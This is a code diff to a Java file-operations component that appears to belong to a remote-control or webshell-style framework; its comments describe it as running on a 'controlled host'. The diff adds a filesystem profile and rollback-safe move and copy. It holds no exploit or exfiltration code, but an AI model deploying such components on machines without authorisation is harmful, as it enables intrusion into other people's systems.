@@ -12,23 +12,11 @@ import java.util.Map;
 /**
  * 文件操作组件，提供跨平台的文件和目录操作功能，设计为在被控主机上稳定执行。
  *
- * <p>遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/匿名内部类/diamond。
  */
 public class FileComponent implements Runnable {
 
-    // 操作类型常量
-    private static final int ACTION_LIST_FILES = 1;
-    private static final int ACTION_DELETE_FILE = 2;
-    private static final int ACTION_CREATE_DIR = 3;
-    private static final int ACTION_CREATE_FILE = 4;
-    private static final int ACTION_MOVE_FILE = 5;
-    private static final int ACTION_LIST_ROOTS = 6;
-    private static final int ACTION_EDIT_FILE = 7;
-    private static final int ACTION_COPY_FILE = 9;
-    private static final int ACTION_GET_FILE_MD5 = 10;
-
-    private static final int MAX_DELETE_DEPTH = 50;                     // 【修复 #2】递归删除最大深度
-    private static final long MAX_WRITE_BYTES = 50L * 1024 * 1024;     // 【修复 #5】写入上限 50MB
+    private static final int MAX_DELETE_DEPTH = 50;
+    private static final long MAX_WRITE_BYTES = 50L * 1024 * 1024;
     private static final int COPY_BUFFER_SIZE = 8192;
 
     private HashMap params;
@@ -63,40 +51,43 @@ public class FileComponent implements Runnable {
      * 文件操作处理
      */
     private void handleFile() throws Exception {
-        // Disguise/JSON 实现可能把整数反序列化为 String 或 UTF-8 byte[]。
-        int action = getRequiredIntParam("action");
+        String action = getStringParam("action");
+        if ("profile".equals(action)) getFileSystemProfile();
+        else if ("list".equals(action)) getFileList();
+        else if ("delete".equals(action)) deleteFile();
+        else if ("createDirectory".equals(action)) createDirectory();
+        else if ("createFile".equals(action)) createNewFile();
+        else if ("move".equals(action)) moveFile();
+        else if ("edit".equals(action)) editFile();
+        else if ("copy".equals(action)) copyFile();
+        else if ("checksum".equals(action)) getFileMD5();
+        else throw new IllegalArgumentException("Invalid action: " + action);
+    }
 
-        switch (action) {
-            case ACTION_LIST_FILES:
-                getFileList();
-                break;
-            case ACTION_DELETE_FILE:
-                deleteFile();
-                break;
-            case ACTION_CREATE_DIR:
-                createDirectory();
-                break;
-            case ACTION_CREATE_FILE:
-                createNewFile();
-                break;
-            case ACTION_MOVE_FILE:
-                moveFile();
-                break;
-            case ACTION_LIST_ROOTS:
-                getRootList();
-                break;
-            case ACTION_EDIT_FILE:
-                editFile();
-                break;
-            case ACTION_COPY_FILE:
-                copyFile();
-                break;
-            case ACTION_GET_FILE_MD5:
-                getFileMD5();
-                break;
-            default:
-                throw new IllegalArgumentException("Invalid action: " + action);
+    private void getFileSystemProfile() {
+        String osName = System.getProperty("os.name", "");
+        boolean windows = osName.toLowerCase().contains("win");
+        List roots = new ArrayList();
+        File[] rootFiles = File.listRoots();
+        if (rootFiles != null) {
+            for (int i = 0; i < rootFiles.length; i++) {
+                roots.add(rootFiles[i].getPath());
+            }
         }
+        Map capabilities = new HashMap();
+        capabilities.put("posixMode", Boolean.valueOf(!windows));
+        capabilities.put("windowsAttributes", Boolean.valueOf(windows));
+        capabilities.put("transactionalUpload", Boolean.TRUE);
+        capabilities.put("rangeRead", Boolean.TRUE);
+        capabilities.put("checksum", Boolean.TRUE);
+
+        results.put("code", Integer.valueOf(200));
+        results.put("osFamily", windows ? "WINDOWS" : "POSIX");
+        results.put("pathStyle", windows ? "WINDOWS" : "POSIX");
+        results.put("separator", File.separator);
+        results.put("caseSensitivity", windows ? "INSENSITIVE" : "SENSITIVE");
+        results.put("roots", roots);
+        results.put("capabilities", capabilities);
     }
 
     /**
@@ -142,14 +133,13 @@ public class FileComponent implements Runnable {
 
         File file = new File(path);
         if (!file.exists()) {
-            // 【修复 #8】统一使用 code: 500
             results.put("code", 500);
             results.put("msg", "file not found: " + path);
             return;
         }
 
         if (file.isDirectory()) {
-            // 【修复 #2】符号链接检测：如果目录本身是 symlink，只删链接不递归
+            // 符号链接仅删除链接本身，不递归进入链接目标。
             if (isSymbolicLink(file)) {
                 boolean success = file.delete();
                 results.put("code", success ? 200 : 500);
@@ -158,7 +148,6 @@ public class FileComponent implements Runnable {
                 return;
             }
 
-            // 【修复 #3】收集删除失败的文件列表
             List failedFiles = new ArrayList();
             boolean success = deleteDirectory(file, 0, failedFiles);
 
@@ -206,7 +195,7 @@ public class FileComponent implements Runnable {
 
     /**
      * 创建新文件
-     * 【修复 #7】支持可选 content 参数
+     * 支持可选 content 参数。
      */
     private void createNewFile() throws Exception {
         String path = getPathFromParams();
@@ -260,15 +249,12 @@ public class FileComponent implements Runnable {
         }
     }
 
-    /**
-     * 移动文件
-     * 【修复 #4】renameTo 失败后 fallback copy+delete
-     * 支持 conflictStrategy: overwrite / autorename / skip（null 保留旧行为）
-     */
+    /** 移动文件，overwrite 时以同目录备份保证失败可回滚。 */
     private void moveFile() throws Exception {
         String sourcePath = getPathFromParams();
         String newPath = getStringParam("newPath");
         String strategy = getStringParam("conflictStrategy");
+        validateConflictStrategy(strategy);
 
         File sourceFile = new File(sourcePath);
         File destFile = new File(newPath);
@@ -301,71 +287,94 @@ public class FileComponent implements Runnable {
             }
         }
 
-        // overwrite：先删旧文件（仅支持文件目标，拒绝目录覆盖以防误删整棵树）
-        if (!prepareOverwriteIfNeeded(destFile, strategy)) {
-            return;
+        File backupFile = null;
+        if ("overwrite".equals(strategy) && destFile.exists()) {
+            if (destFile.isDirectory()) {
+                results.put("code", Integer.valueOf(500));
+                results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath());
+                return;
+            }
+            backupFile = createBackupFile(destFile);
+            if (!destFile.renameTo(backupFile)) {
+                results.put("code", Integer.valueOf(500));
+                results.put("msg", "cannot prepare target backup: " + destFile.getAbsolutePath());
+                return;
+            }
         }
 
         if (sourceFile.renameTo(destFile)) {
+            deleteBackup(backupFile);
             results.put("code", 200);
             results.put("msg", "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
             results.put("newPath", destFile.getAbsolutePath());
             return;
         }
 
-        // 【修复 #4】renameTo 失败（可能跨文件系统），尝试 copy+delete
         if (!sourceFile.isFile()) {
-            // 目录的跨分区移动暂不支持 fallback
+            restoreBackup(destFile, backupFile);
             results.put("code", 500);
             results.put("msg", "move failed (cross-filesystem directory move not supported): "
                     + sourcePath + " -> " + destFile.getAbsolutePath());
             return;
         }
 
-        // copy
-        long totalBytes = copyFileContent(sourceFile, destFile);
-
-        // 保留修改时间
-        destFile.setLastModified(sourceFile.lastModified());
-
-        // delete source
-        if (sourceFile.delete()) {
+        try {
+            long totalBytes = copyFileContent(sourceFile, destFile);
+            destFile.setLastModified(sourceFile.lastModified());
+            if (!sourceFile.delete()) {
+                restoreBackup(destFile, backupFile);
+                results.put("code", Integer.valueOf(500));
+                results.put("msg", "move rollback: source delete failed: " + sourcePath);
+                return;
+            }
+            deleteBackup(backupFile);
             results.put("code", 200);
-            results.put("msg", "moved (copy+delete fallback): " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
+            results.put("msg", "moved: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
             results.put("newPath", destFile.getAbsolutePath());
             results.put("size", Long.valueOf(totalBytes));
-        } else {
-            // 复制成功但删除源失败
-            results.put("code", 200);
-            results.put("msg", "copied but source delete failed: " + sourcePath);
-            results.put("warning", "source file still exists: " + sourcePath);
-            results.put("newPath", destFile.getAbsolutePath());
+        } catch (Exception error) {
+            restoreBackup(destFile, backupFile);
+            throw error;
         }
     }
 
-    /**
-     * 获取根目录列表
-     */
-    private void getRootList() {
-        List fileList = new ArrayList();
-        File[] roots = File.listRoots();
-
-        if (roots != null) {
-            for (int i = 0; i < roots.length; i++) {
-                Map fileInfo = getFileInfoMap(roots[i]);
-                fileList.add(fileInfo);
+    private File createBackupFile(File target) {
+        File parent = target.getParentFile();
+        String name = target.getName();
+        for (int i = 0; i < 1000; i++) {
+            File candidate = new File(parent,
+                    name + ".leo-backup-" + System.currentTimeMillis() + "-" + i);
+            if (!candidate.exists()) {
+                return candidate;
             }
         }
+        return new File(parent, name + ".leo-backup-" + System.nanoTime());
+    }
 
-        results.put("code", 200);
-        results.put("fileList", fileList);
-        results.put("absolutePath", "/");
-        results.put("count", Integer.valueOf(fileList.size()));
+    private void restoreBackup(File target, File backup) {
+        if (backup == null || !backup.exists()) {
+            if (target.exists()) {
+                target.delete();
+            }
+            return;
+        }
+        if (target.exists() && !target.delete()) {
+            throw new IllegalStateException("cannot remove incomplete target: " + target.getAbsolutePath());
+        }
+        if (!backup.renameTo(target)) {
+            throw new IllegalStateException("cannot restore target backup: " + target.getAbsolutePath());
+        }
+    }
+
+    private void deleteBackup(File backup) {
+        if (backup != null && backup.exists() && !backup.delete()) {
+            backup.deleteOnExit();
+        }
     }
 
     /**
      * 编辑文件
-     * 【修复 #5】增加写入大小限制
+     * 编辑文件。
      */
     private void editFile() throws Exception {
         String path = getPathFromParams();
@@ -377,7 +386,6 @@ public class FileComponent implements Runnable {
             return;
         }
 
-        // 【修复 #5】大小限制
         if (content.length > MAX_WRITE_BYTES) {
             results.put("code", 500);
             results.put("msg", "content too large: " + content.length + " bytes, max: " + MAX_WRITE_BYTES);
@@ -439,13 +447,14 @@ public class FileComponent implements Runnable {
 
     /**
      * 复制文件
-     * 【修复 #6】保留最后修改时间
-     * 支持 conflictStrategy: overwrite / autorename / skip（null 保留旧行为）
+     * 复制文件并保留最后修改时间。
+     * 支持 conflictStrategy: overwrite / autorename / skip。
      */
     private void copyFile() throws Exception {
         String sourcePath = getPathFromParams();
         String destPath = getStringParam("destPath");
         String strategy = getStringParam("conflictStrategy");
+        validateConflictStrategy(strategy);
 
         File sourceFile = new File(sourcePath);
         File destFile = new File(destPath);
@@ -484,50 +493,33 @@ public class FileComponent implements Runnable {
             }
         }
 
-        // overwrite：FileOutputStream 会自动覆盖文件；若目标是目录则拒绝
-        if (!prepareOverwriteIfNeeded(destFile, strategy)) {
-            return;
+        File backupFile = null;
+        if ("overwrite".equals(strategy) && destFile.exists()) {
+            if (destFile.isDirectory()) {
+                results.put("code", Integer.valueOf(500));
+                results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath());
+                return;
+            }
+            backupFile = createBackupFile(destFile);
+            if (!destFile.renameTo(backupFile)) {
+                results.put("code", Integer.valueOf(500));
+                results.put("msg", "cannot prepare target backup: " + destFile.getAbsolutePath());
+                return;
+            }
         }
 
-        long totalBytes = copyFileContent(sourceFile, destFile);
-
-        // 【修复 #6】保留最后修改时间
-        destFile.setLastModified(sourceFile.lastModified());
-
-        results.put("code", 200);
-        results.put("msg", "copied: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
-        results.put("newPath", destFile.getAbsolutePath());
-        results.put("size", Long.valueOf(totalBytes));
-    }
-
-    /**
-     * overwrite 策略下清理目标位置上的旧文件。
-     *
-     * 出于安全考虑，仅支持覆盖普通文件；目标若是已存在的目录则拒绝（避免一次"复制/移动"
-     * 误删整棵目录树）。其他策略（autorename / skip / null）调用前已经把目标解析成了
-     * 不冲突的路径，这里直接放行。
-     *
-     * @return true 表示可以继续执行；false 表示已写好错误响应，调用方应直接 return
-     */
-    private boolean prepareOverwriteIfNeeded(File destFile, String strategy) {
-        if (!"overwrite".equals(strategy)) {
-            return true;
+        try {
+            long totalBytes = copyFileContent(sourceFile, destFile);
+            destFile.setLastModified(sourceFile.lastModified());
+            deleteBackup(backupFile);
+            results.put("code", 200);
+            results.put("msg", "copied: " + sourceFile.getName() + " -> " + destFile.getAbsolutePath());
+            results.put("newPath", destFile.getAbsolutePath());
+            results.put("size", Long.valueOf(totalBytes));
+        } catch (Exception error) {
+            restoreBackup(destFile, backupFile);
+            throw error;
         }
-        if (!destFile.exists()) {
-            return true;
-        }
-        if (destFile.isDirectory()) {
-            results.put("code", 500);
-            results.put("msg", "cannot overwrite directory: " + destFile.getAbsolutePath()
-                    + " (target is a directory; please remove it manually first)");
-            return false;
-        }
-        if (!destFile.delete()) {
-            results.put("code", 500);
-            results.put("msg", "cannot overwrite: " + destFile.getAbsolutePath());
-            return false;
-        }
-        return true;
     }
 
     /**
@@ -541,7 +533,7 @@ public class FileComponent implements Runnable {
         if (dest == null || !dest.exists()) {
             return dest;
         }
-        if (strategy == null || strategy.length() == 0 || "overwrite".equals(strategy)) {
+        if ("overwrite".equals(strategy)) {
             return dest;
         }
         if ("skip".equals(strategy)) {
@@ -550,8 +542,15 @@ public class FileComponent implements Runnable {
         if ("autorename".equals(strategy)) {
             return autoRename(dest);
         }
-        // 未知策略保留旧行为
-        return dest;
+        throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
+    }
+
+    private void validateConflictStrategy(String strategy) {
+        if (!"overwrite".equals(strategy)
+                && !"autorename".equals(strategy)
+                && !"skip".equals(strategy)) {
+            throw new IllegalArgumentException("unsupported conflictStrategy: " + strategy);
+        }
     }
 
     /**
@@ -591,7 +590,7 @@ public class FileComponent implements Runnable {
     }
 
     /**
-     * 安全获取字符串参数（兼容 String 和 byte[] 两种传入形式）
+     * 获取字符串参数。传输层中的文本字段以 UTF-8 byte[] 到达远端组件。
      */
     private String getStringParam(String key) throws UnsupportedEncodingException {
         Object value = params.get(key);
@@ -605,32 +604,7 @@ public class FileComponent implements Runnable {
     }
 
     /**
-     * 获取必填整数参数，兼容不同传输编解码器产生的 Number/String/byte[]。
-     */
-    private int getRequiredIntParam(String key) throws UnsupportedEncodingException {
-        Object value = params.get(key);
-        if (value == null) {
-            throw new IllegalArgumentException(key + " is required");
-        }
-        if (value instanceof Number) {
-            return ((Number) value).intValue();
-        }
-
-        String text;
-        if (value instanceof byte[]) {
-            text = new String((byte[]) value, "UTF-8");
-        } else {
-            text = String.valueOf(value);
-        }
-        try {
-            return Integer.parseInt(text.trim());
-        } catch (NumberFormatException e) {
-            throw new IllegalArgumentException(key + " must be an integer: " + text);
-        }
-    }
-
-    /**
-     * 复制文件内容（提取公共方法供 copyFile 和 moveFile fallback 使用）
+     * 复制文件内容。
      */
     private long copyFileContent(File source, File dest) throws Exception {
         long totalBytes = 0;
@@ -681,7 +655,7 @@ public class FileComponent implements Runnable {
 
     /**
      * 检查文件是否可执行
-     * 兼容 Java 1.5 — 反射调用 canExecute（Java 1.6+）
+     * 读取可执行权限。
      */
     private boolean canExecute(File file) {
         try {
@@ -696,8 +670,8 @@ public class FileComponent implements Runnable {
     }
 
     /**
-     * 【修复 #2】检测是否为符号链接
-     * Java 1.6 无 Files.isSymbolicLink()，通过 canonical vs absolute 路径比较近似判断
+     * 检测是否为符号链接。远端组件保持 Java 6 API 基线，因此通过
+     * canonical path 与 absolute path 比较，不依赖 NIO。
      */
     private boolean isSymbolicLink(File file) {
         try {
@@ -717,7 +691,7 @@ public class FileComponent implements Runnable {
     }
 
     /**
-     * 【修复 #2 + #3】递归删除目录，带深度限制和失败收集
+     * 递归删除目录，带深度限制和失败收集。
      *
      * @param directory   要删除的目录
      * @param depth       当前递归深度
@@ -725,7 +699,6 @@ public class FileComponent implements Runnable {
      * @return 目录本身是否删除成功
      */
     private boolean deleteDirectory(File directory, int depth, List failedFiles) {
-        // 【修复 #2】深度限制
         if (depth > MAX_DELETE_DEPTH) {
             failedFiles.add(directory.getAbsolutePath() + " (max depth exceeded)");
             return false;
@@ -740,11 +713,10 @@ public class FileComponent implements Runnable {
             for (int i = 0; i < files.length; i++) {
                 File child = files[i];
 
-                // 【修复 #2】如果子项是符号链接，只删链接本身不递归
+                // 子项为符号链接时仅删除链接本身。
                 if (child.isDirectory() && !isSymbolicLink(child)) {
                     deleteDirectory(child, depth + 1, failedFiles);
                 } else {
-                    // 【修复 #3】记录删除失败
                     if (!child.delete()) {
                         failedFiles.add(child.getAbsolutePath());
                     }
